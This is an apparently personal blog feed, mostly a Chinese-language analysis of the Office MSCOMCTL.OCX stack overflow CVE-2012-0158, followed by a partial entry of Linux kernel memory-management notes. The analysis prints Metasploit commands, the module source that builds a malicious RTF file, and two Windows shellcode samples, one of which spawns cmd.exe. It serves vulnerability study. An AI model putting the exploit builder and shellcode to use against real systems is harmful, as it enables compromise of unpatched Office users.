    <content type="html"><![CDATA[<h3 id="exp生成"><a href="#exp生成" class="headerlink" title="exp生成"></a>exp生成</h3><p>首先可以利用了metasploit生成一个能够弹计算器的样本.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search CVE-2012-0158</span><br><span class="line">use exploit/windows/fileformat/ms12_027_mscomctl_bof</span><br><span class="line">set PAYLOAD windows/exec</span><br><span class="line">set CMD calc.exe</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p><p>这样的话我们就得到了一个能够弹计算机的一个样本.</p><p>测试环境:</p><p>操作系统 : windows 7 sp1<br>office版本: office 2007<br>工具: windbg+x32dbg+010editor+oletools </p><p>可以顺利的弹出计算器.</p><div class="article-img"><p><img src="/img/cal.png" alt="计算器弹出"></p></div><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>网上很多的分析都是基于知道漏洞的溢出点在MSCOMCTL.OCX,然后通过栈回溯回溯到溢出点.但是在网络上没有任何的资料的时候,该怎么以一种另外的方式来分析这个漏洞呢,我在一篇文章(<a href="https://zhuanlan.kanxue.com/article-501.htm" target="_blank" rel="noopener">https://zhuanlan.kanxue.com/article-501.htm</a>) 中看到一种方法.</p><blockquote><p>方法是：对这块栈下写入记录断点，根据断点输出情况来分析。但是这个断点会影响效率，所以我们尽可能晚的去下记录断点。我们在准备打开文件时Ctrl+Break抛出一个断点。然后下断ba w 4 0x12165C “r eip;gc”</p></blockquote><p>先通过windbg附加,然后通过栈回溯找到shellcode执行处,最后通过写入断点直接打到漏洞溢出的地方,这个方法非常的恰当,但是当我执行的时候发现了一个问题.</p><p>那就是:win7中栈开启了aslr,这个栈是在变化的,而且没有固定的offset,无法确定写入栈的地址.</p><p>这就让我有一丝的小尴尬,我想了一段时间,突然在win32dbg的日志窗口中发现了如下日志:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在模块 mscomctl.ocx 中没有找到任何支持的调试类型！</span><br><span class="line">DLL已载入： 27580000 C:\Windows\SysWOW64\MSCOMCTL.OCX</span><br><span class="line">线程 8F0 已启动，入口： winspool.734146FA</span><br><span class="line">DLL已载入： 0EBE0000 C:\Windows\SysWOW64\calc.exe</span><br><span class="line">DLL已卸载： 0EBE0000 calc.exe</span><br></pre></td></tr></table></figure></p><p>我突然想到,通过日志中的dll载入对载入的dll依次进行dll断点不就可以么,只要在cal.exe弹出前断下点即可.</p><p>所以我首先加入了MSCOMCTL.OCX载入断点.</p><div class="article-img"><p><img src="/img/bp1.png" alt="dll断点"></p></div><p>之后通过不断的步进步入,终于在wwlib.dll的如下语句进入到了MSCOMCTL.OCX的范围内:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">69BD2900 | 50                       | push eax                                               |</span><br><span class="line">69BD2901 | FF51 18                  | call dword ptr ds:[ecx+18]                             |</span><br></pre></td></tr></table></figure></p><p>进入到MSCOMCTL.OCX领空之后需要细致的调试,不断步入,最后到达如下语句:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">27583C30 | FFE4                     | jmp esp                                                |</span><br></pre></td></tr></table></figure></p><p>好,完美,到达我们的ret的rop跳转上了.这样的话我们分析之前的那个函数就可以了.</p><p>通过调试我们可以发现如执行了如下语句栈被溢出:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">sub_275C89C7</span><span class="params">(<span class="keyword">int</span> a1, BSTR bstrString)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  v2 = bstrString;</span><br><span class="line">  result = sub_275C876D((<span class="keyword">int</span>)&amp;v5, bstrString, <span class="number">0xC</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">0x6A626F43</span> &amp;&amp; dwBytes &gt;= <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = sub_275C876D((<span class="keyword">int</span>)&amp;v7, v2, dwBytes);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></p><p>继续分析sub_275C876D()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">if ( v6 &gt;= 0 )</span><br><span class="line">      &#123;</span><br><span class="line">        qmemcpy((void *)a1, lpMema, dwBytes);</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>a1, lpMema, dwBytes三个参数都是从栈上传进来的参数,dwBytes表示qmemcpy的字节数.</p><p>调试的时候我们发现dwBytes是从rtf文件中读取进来的.</p><div class="article-img"><p><img src="/img/dw.png" alt="dw"></p></div><p>我们再看sub_275C89C7中的判断语句if ( v5 == 0x6A626F43 &amp;&amp; dwBytes &gt;= 8 ),这就很尴尬了,明明是&lt;=8,这里竟然变成了&gt;=8,难怪各位大佬要说这个是微软后门了….</p><p>利用x32dbg动调的话可以非常清楚的看到栈是如何被溢出的.</p><div class="article-img"><p><img src="/img/over4.png" alt="ov"></p></div><div class="article-img"><p><img src="/img/over2.png" alt="over2"></p></div><div class="article-img"><p><img src="/img/over3.png" alt="over3"></p></div><p>总体来说这个漏洞算是非常简单的一个漏洞了,没有华丽的手法,只有非常朴实的栈溢出和一句话的rop,但是这个漏洞确实非常的耐用,windows7+office2007的版本在今天来说都能够拥有广大的使用群众,所以这个漏洞的影响力可以说是非常大了.</p><p>动态调试的时候需要一些耐心,感觉dll载入断点还是一个比较有用的一个方法吧.</p><p>metasploit生成shellcode有一段解码的过程,这就不详细说明了.</p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>动态调试我大致知道了这个漏洞的触发流程,但是该样本是如何构造的呢,这里我用的metasploit生成的是个doc文档,但是我打开它的时候发现这是一个rtf文件,</p><div class="article-img"><p><img src="/img/rtf.png" alt="rtf"></p></div><p>然后我利用oletools的rtfobj对该文件进行了解压.然后利用010editor打开msf.doc_object_000000A0.bin</p><div class="article-img"><p><img src="/img/rtfobj.png" alt="rtf2"></p></div><p>我之前在动态分析的时候发现了如下语句<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v5 == <span class="number">0x6A626F43</span> &amp;&amp; dwBytes &gt;= <span class="number">8</span> )</span><br></pre></td></tr></table></figure></p><p>查找字符6A626F43</p><div class="article-img"><p><img src="/img/Cobj.png" alt="rtf3"></p></div><p>这样的话定位到了关键的Cobj字符和接下来的shellcode.</p><h3 id="构造样本"><a href="#构造样本" class="headerlink" title="构造样本"></a>构造样本</h3><h4 id="构造xls文件"><a href="#构造xls文件" class="headerlink" title="构造xls文件"></a>构造xls文件</h4><p>在 <a href="https://weiyiling.cn/one/cve_2012_0158_ms12-027" target="_blank" rel="noopener">https://weiyiling.cn/one/cve_2012_0158_ms12-027</a> 这篇博客里,博主把该漏洞分析的非常之清晰,而且这也是我目前唯一找到的一篇分析listview的文章.文章中通过添加Microsoft ListView Control控件,并通过vba对该控件的长度进行扩容,最后通过动调一步一步的改变xls的内容进行样本的构造,视频中讲的十分的清晰.所以这里我也就不写构造的过程了.</p><p>但是我在word中失败了,通过word添加控件之后并不会像excel中直接将listview暴露出来,而是感觉像是做了一个压缩.<br>通过oletools的oledir进行查看,发现我创建的doc是存在listview这个控件的.</p><div class="article-img"><p><img src="/img/wordole.png" alt="rtf"></p></div><h4 id="利用metasploit脚本构造rtf文件"><a href="#利用metasploit脚本构造rtf文件" class="headerlink" title="利用metasploit脚本构造rtf文件"></a>利用metasploit脚本构造rtf文件</h4><p>metasploit脚本可供我们自定义shellcode,脚本大致如下(exploits/windows/fileformat/ms12_027_mscomctl_bof.rb):<br><figure class="highlight rb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># This module requires Metasploit: https://metasploit.com/download</span></span><br><span class="line"><span class="comment"># Current source: https://github.com/rapid7/metasploit-framework</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MetasploitModule</span> &lt; Msf::Exploit::<span class="title">Remote</span></span></span><br><span class="line">  Rank = AverageRanking</span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> Msf::Exploit::FILEFORMAT</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">stream</span><span class="params">(bytes)</span></span></span><br><span class="line">    Rex::Text.to_hex(bytes).gsub(<span class="string">"\\x"</span>, <span class="string">""</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">junk</span><span class="params">(n=<span class="number">1</span>)</span></span></span><br><span class="line">    tmp = []</span><br><span class="line">    value = rand_text(<span class="number">4</span>).unpack(<span class="string">"L"</span>)[<span class="number">0</span>].to_i</span><br><span class="line">    n.times &#123; tmp &lt;&lt; value &#125;</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">exploit</span></span></span><br><span class="line"></span><br><span class="line">    ret_address = stream([target.ret].pack(<span class="string">"V"</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> target[<span class="string">'Rop'</span>]</span><br><span class="line">      shellcode = stream(create_rop_chain)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="comment"># To avoid shellcode being corrupted in the stack before ret</span></span><br><span class="line">      shellcode = stream(make_nops(target[<span class="string">'Offset'</span>]))</span><br><span class="line">      shellcode &lt;&lt; stream(Metasm::Shellcode.assemble(Metasm::Ia32.new, <span class="string">"jmp $+6"</span>).encode_string)</span><br><span class="line">      shellcode &lt;&lt; stream(make_nops(<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    shellcode &lt;&lt; stream(payload.encoded)</span><br><span class="line">    <span class="keyword">while</span> shellcode.length &lt; <span class="number">2378</span></span><br><span class="line">      shellcode += <span class="string">"0"</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    content = <span class="string">"&#123;\\rtf1"</span></span><br><span class="line">    content &lt;&lt; <span class="string">"&#123;\\fonttbl&#123;\\f0\\fnil\\fcharset0 Verdana;&#125;&#125;"</span></span><br><span class="line">    content &lt;&lt; <span class="string">"\\viewkind4\\uc1\\pard\\sb100\\sa100\\lang9\\f0\\fs22\\par"</span></span><br><span class="line">    content &lt;&lt; <span class="string">"\\pard\\sa200\\sl276\\slmult1\\lang9\\fs22\\par"</span></span><br><span class="line">    content &lt;&lt; <span class="string">"&#123;\\object\\objocx"</span></span><br><span class="line">    content &lt;&lt; <span class="string">"&#123;\\*\\objdata"</span></span><br><span class="line">    content &lt;&lt; <span class="string">"\n"</span></span><br><span class="line">    content &lt;&lt; <span class="string">"01050000020000001B0000004D53436F6D63746C4C69622E4C697374566965774374726C2E320000"</span></span><br><span class="line">    content &lt;&lt; <span class="string">"00000000000000000E0000"</span></span><br><span class="line">    ...</span><br><span class="line">    content &lt;&lt; <span class="string">"6D736400000002000000010000000C000000436F626A640000008282000082820000000000000000"</span></span><br><span class="line">    content &lt;&lt; <span class="string">"000000000000"</span></span><br><span class="line">    content &lt;&lt; ret_address</span><br><span class="line">    content &lt;&lt; <span class="string">"9090909090909090"</span></span><br><span class="line">    content &lt;&lt; shellcode</span><br><span class="line">    content &lt;&lt; <span class="string">"00000000000000000000000000000000000000000000000000000000000000000000000000000000"</span></span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    content &lt;&lt; <span class="string">"\n"</span></span><br><span class="line">    content &lt;&lt; <span class="string">"&#125;"</span></span><br><span class="line">    content &lt;&lt; <span class="string">"&#125;"</span></span><br><span class="line">    content &lt;&lt; <span class="string">"&#125;"</span></span><br><span class="line"></span><br><span class="line">    print_status(<span class="string">"Creating '<span class="subst">#&#123;datastore[<span class="string">'FILENAME'</span>]&#125;</span>' file ..."</span>)</span><br><span class="line">    file_create(content)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h3 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h3><p>我编写的shellcode较少,不太会各种技巧…所以这里就用最简单的一些shellcode来填充好了,因为函数地址写死了,所以应该存在兼容性问题.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x33\xc0&quot;                          # XOR EAX,EAX</span><br><span class="line">&quot;\x50&quot;                              # PUSH EAX      =&gt; padding for lpCaption</span><br><span class="line">&quot;\x68\x36\x36\x36\x36&quot;              # PUSH &quot;6666&quot;</span><br><span class="line">&quot;\x8B\xCC&quot;                          # MOV ECX,ESP   =&gt; PTR to lpCaption</span><br><span class="line">&quot;\x50&quot;                              # PUSH EAX      =&gt; padding for lpText</span><br><span class="line">&quot;\x68\x36\x36\x36\x36&quot;              # PUSH &quot;666!&quot;</span><br><span class="line">&quot;\x68\x36\x36\x36\x36&quot;              # PUSH &quot;6666&quot;</span><br><span class="line">&quot;\x68\x36\x36\x36\x36&quot;              # PUSH &quot;6666&quot;</span><br><span class="line">&quot;\x8B\xD4&quot;                          # MOV EDX,ESP   =&gt; PTR to lpText</span><br><span class="line">&quot;\x50&quot;                              # PUSH EAX - uType=0x0</span><br><span class="line">&quot;\x51&quot;                              # PUSH ECX - lpCaption</span><br><span class="line">&quot;\x52&quot;                              # PUSH EDX - lpText</span><br><span class="line">&quot;\x50&quot;                              # PUSH EAX - hWnd=0x0</span><br><span class="line">&quot;\xBE\x1E\xFD\x53\x76&quot;              # MOV ESI,USER32.2</span><br><span class="line">&quot;\xFF\xD6&quot;                          # CALL ESI</span><br><span class="line">&quot;\x50&quot;                              # PUSH EAX</span><br><span class="line">&quot;\xBE\x10\x7A\xAC\x75&quot;              # MOV ESI,KENREL32.EXITPROCESS</span><br><span class="line">&quot;\xFF\xD6&quot;                          # CALL ESI</span><br></pre></td></tr></table></figure></p><p>利用上面的构造xls文件方法进行样本的构造,并且把shellcode写入,能够成功的弹出6666的对话框和正常的退出excel.</p><div class="article-img"><p><img src="/img/popup.png" alt="popup"></p></div><h4 id="通用型shellcode"><a href="#通用型shellcode" class="headerlink" title="通用型shellcode"></a>通用型shellcode</h4><p>来自<a href="http://shell-storm.org/shellcode/files/shellcode-662.php" target="_blank" rel="noopener">http://shell-storm.org/shellcode/files/shellcode-662.php</a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Title: Allwin WinExec cmd.exe + ExitProcess Shellcode - 195 bytes</span></span><br><span class="line"><span class="comment">Date: 2010-06-25</span></span><br><span class="line"><span class="comment">Author: RubberDuck</span></span><br><span class="line"><span class="comment">Web: http://bflow.security-portal.cz</span></span><br><span class="line"><span class="comment">Tested on: Win 2k, Win 2003, Win XP Home SP2/SP3 CZ/ENG (32), Win Vista (32)/(64), Win 7 (32)/(64), Win 2k8 (32)</span></span><br><span class="line"><span class="comment">Thanks to: kernelhunter, Lodus, Vrtule and others</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[]=</span><br><span class="line">    <span class="string">"\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"</span></span><br><span class="line">    <span class="string">"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"</span></span><br><span class="line">    <span class="string">"\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C"</span></span><br><span class="line">    <span class="string">"\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"</span></span><br><span class="line">    <span class="string">"\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B"</span></span><br><span class="line">    <span class="string">"\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"</span></span><br><span class="line">    <span class="string">"\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"</span></span><br><span class="line">    <span class="string">"\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"</span></span><br><span class="line">    <span class="string">"\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F"</span></span><br><span class="line">    <span class="string">"\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"</span></span><br><span class="line">    <span class="string">"\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66"</span></span><br><span class="line">    <span class="string">"\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"</span></span><br><span class="line">    <span class="string">"\x8E\x03\xD3\x52\x68\x78\x65\x63\x01\xFE"</span></span><br><span class="line">    <span class="string">"\x4C\x24\x03\x68\x57\x69\x6E\x45\x54\x53"</span></span><br><span class="line">    <span class="string">"\xFF\xD2\x68\x63\x6D\x64\x01\xFE\x4C\x24"</span></span><br><span class="line">    <span class="string">"\x03\x6A\x05\x33\xC9\x8D\x4C\x24\x04\x51"</span></span><br><span class="line">    <span class="string">"\xFF\xD0\x68\x65\x73\x73\x01\x8B\xDF\xFE"</span></span><br><span class="line">    <span class="string">"\x4C\x24\x03\x68\x50\x72\x6F\x63\x68\x45"</span></span><br><span class="line">    <span class="string">"\x78\x69\x74\x54\xFF\x74\x24\x20\xFF\x54"</span></span><br><span class="line">    <span class="string">"\x24\x20\x57\xFF\xD0"</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Size = %d\n"</span>, <span class="built_in">strlen</span>(shellcode));</span><br><span class="line"> </span><br><span class="line">    system(<span class="string">"PAUSE"</span>);</span><br><span class="line"> </span><br><span class="line">    ((<span class="keyword">void</span> (*)())shellcode)();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>该漏洞利用方式比较简单,但是越简单的漏洞通用型就越高,之前对windows下的漏洞分析较少,现在看来windows下的漏洞确实更有趣些.office的大洞有很多,自己还需慢慢努力.</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://weiyiling.cn/one/cve_2012_0158_ms12-027" target="_blank" rel="noopener">https://weiyiling.cn/one/cve_2012_0158_ms12-027</a><br><a href="http://www.youngroe.com/2016/05/23/Debug/debug-vulner-stackoverflows-2012-0158/" target="_blank" rel="noopener">http://www.youngroe.com/2016/05/23/Debug/debug-vulner-stackoverflows-2012-0158/</a><br><a href="https://zhuanlan.kanxue.com/article-501.htm" target="_blank" rel="noopener">https://zhuanlan.kanxue.com/article-501.htm</a><br><a href="https://www.anquanke.com/post/id/91643" target="_blank" rel="noopener">https://www.anquanke.com/post/id/91643</a><br><a href="http://shell-storm.org/shellcode/files/shellcode-662.php" target="_blank" rel="noopener">http://shell-storm.org/shellcode/files/shellcode-662.php</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;exp生成&quot;&gt;&lt;a href=&quot;#exp生成&quot; class=&quot;headerlink&quot; title=&quot;exp生成&quot;&gt;&lt;/a&gt;exp生成&lt;/h3&gt;&lt;p&gt;首先可以利用了metasploit生成一个能够弹计算器的样本.&lt;br&gt;&lt;figure class=&quot;highligh
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>linux内核下的内存管理笔记</title>
    <link href="https://foyjog.github.io/2018/09/06/linux%E5%86%85%E6%A0%B8%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%AC%94%E8%AE%B0/"/>
    <id>https://foyjog.github.io/2018/09/06/linux内核下的内存管理笔记/</id>
    <published>2018-09-06T08:52:08.000Z</published>
    <updated>2018-09-06T10:26:52.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="关于内核内存"><a href="#关于内核内存" class="headerlink" title="关于内核内存"></a>关于内核内存</h3><p>因为在做内核方面的技术,所以想要对内核内存管理做一些分析,之前看雪的老哥给我发了一些他对physmap见解,果然大佬就是大佬,做什么都能看到很深的点.<br>关于physmap在32位下其实就是ZONE_NORMAL区域,在内核分配内存的时候,一般都是从ZONE_NORMAL区域开始分配.而mmap一开始会在ZONE_HIGHMEM进行分配,一旦ZONE_HIGHMEM区域不够,就会从ZONE_NORMAL区域进行内存分配,所以才有mmap的对象可以覆盖掉内核对象的情况出现.</p><h3 id="两张图"><a href="#两张图" class="headerlink" title="两张图"></a>两张图</h3><p>这两图非常nice,看书的时候内存管理看得我一脸懵逼,这些图总算能让我对内存分配有一些基本了解.</p><p>第一张图:</p><div class="article-img"><p><img src="/img/mem1.jpg" alt="第一张图"></p></div><p>在linux内核中，所有的物理内存都用struct page结构来描述，这些对象以数组形式存放，而这个数组的地址就是mem_map。</p><p>第二张图:<br><img src="/img/mem2.jpg" alt="第二张图"></p><p>__alloc_pages是底层的函数用来分配页面.<br>图中显示(我发现4.10.6和2.6.36差别还是很大的= =)do_brk()和do_mmap()都调用了do_mmap_pgoff(),do_mmap_pgoff()调用了get_unmapped_area().</p><blockquote><p>进程调用mmap()时，只是在进程空间内新增了一块相应大小的缓冲区，并设置了相应的访问标识，但并没有建立进程空间到物理页面的映射。因此，第一次访问该空间时，会引发一个缺页异常。 </p><p>Mmap映射在第一次读写的时候，会进入缺页异常处理流程中，最后会调用<br>do_anonymous_page<br>—&gt;alloc_zeroed_user_highpage_movable<br>—&gt;__alloc_zeroed_user_highpage<br>—&gt;alloc_page_vma(GFP_HIGHUSER | movableflags,vma, vaddr);<br>看一下GFP_HIGHUSER定义</p><p>#define GFP_HIGHUSER    (GFP_USER | <strong>GFP_HIGHMEM)</strong>GFP_HIGHMEM表示优先从高端内存区分配</p></blockquote><h3 id="关于slab"><a href="#关于slab" class="headerlink" title="关于slab"></a>关于slab</h3><p>slab的话怎么讲,就是内核准备了很多的内存块块,如果你要用我就分配给你.<br>看图:<br><img src="/img/slab.png" alt="第三张图"><br>看,kmalloc有8-8192很多类型的slab,也就是说,kmalloc使用了slab进行内存的分配.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *__do_kmalloc(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags,</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> caller)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">cachep</span>;</span></span><br><span class="line"><span class="keyword">void</span> *ret;</span><br><span class="line"></span><br><span class="line">cachep = kmalloc_slab(size, flags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(cachep)))</span><br><span class="line"><span class="keyword">return</span> cachep;</span><br><span class="line">ret = slab_alloc(cachep, flags, caller);</span><br><span class="line"></span><br><span class="line">kasan_kmalloc(cachep, ret, size, flags);</span><br><span class="line">trace_kmalloc(caller, ret,</span><br><span class="line">      size, cachep-&gt;size, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>如刚才所有，我们看到有些SLAB的名字比较特别，如TCP,UDP,dquot这些，它们都是专用SLAB，专属于它们自己的模块。而后面这张图，如kmalloc-8，kmalloc-16…还有dma-kmalloc-96，dma-kmalloc-192…这些都是普通SLAB，当需要为一些小数据分配内存时(比如一个结构体)，就会从这些普通SLAB中获取内存。值得注意的是，对于kmalloc-8这些普通SLAB，都有一个对应的dma-kmalloc-8这种类型的普通SLAB，这种类型是专门使用了ZONE-DMA区域的内存，方便用于DMA模式申请内存。</p></blockquote><h3 id="关于SLAB着色"><a href="#关于SLAB着色" class="headerlink" title="关于SLAB着色"></a>关于SLAB着色</h3><blockquote><p>看名字很难理解，其实又很好理解，我们知道内存需要处理时要先放入CPU硬件高速缓存中，而CPU硬件高速缓存与内存的映射方式有多种。在同一个kmem_cache中所有SLAB都是相同大小，都是相同连续长度的页框组成，这样的话在不同SLAB中相同对象号对于页框的首地址的偏移量也相同，这样有很可能导致不同SLAB中相同对象号的对象放入CPU硬件高速缓存时会处于同一行，当我们交替操作这两个对象时，CPU的cache就会交替换入换出，效率就非常差。SLAB着色就是在同一个kmem_cache中对不同的SLAB添加一个偏移量，就让相同对象号的对象不会对齐，也就不会放入硬件高速缓存的同一行中，提高了效率</p></blockquote><p>在SLAB描述符中，最重要的可能就是s_mem和freelist这两个指针。s_mem用于指向这段连续页框中第一个对象，freelist指向空闲对象链表。<br><img src="/img/slab2.jpg" alt="第四张图"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://cloud.tencent.com/developer/article/1114226" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1114226</a><br><a 